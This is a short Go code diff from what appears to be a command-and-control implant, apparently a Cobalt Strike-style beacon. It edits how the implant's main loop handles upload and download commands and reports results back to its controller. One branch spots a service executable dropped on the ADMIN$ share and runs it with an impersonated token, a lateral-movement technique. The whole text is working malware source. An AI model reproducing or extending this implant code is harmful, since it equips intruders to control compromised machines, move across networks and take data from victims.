@@ -99,13 +99,14 @@ func main() {
 							match := len(filePath) == 30 && bytes.HasPrefix(filePath, []byte("\\\\127.0.0.1\\ADMIN$\\")) && bytes.HasSuffix(filePath, []byte(".exe"))
 							if match && bytes.Contains(fileData, []byte("RegisterServiceCtrlHandlerA")) && len(fileData) > 250000 && len(fileData) < 350000 {
 								result, err = services.CmdService(Token, argues)
+								callbackType = 0
 							} else {
 								result, err = services.CmdUpload(cmdBuf, true)
+								callbackType = -1
 							}
-							callbackType = 0
 						case packet.CMD_TYPE_UPLOAD_LOOP:
 							result, err = services.CmdUpload(cmdBuf, false)
-							callbackType = 0
+							callbackType = -1
 						case packet.CMD_TYPE_DOWNLOAD:
 							result, err = services.CmdDownload(cmdBuf)
 							callbackType = 0
@@ -251,7 +252,9 @@ func main() {
 						if err != nil {
 							communication.ErrorProcess(err)
 						} else {
-							communication.DataProcess(callbackType, result)
+							if callbackType >= 0 {
+								communication.DataProcess(callbackType, result)
+							}
 						}
 					}
 				}
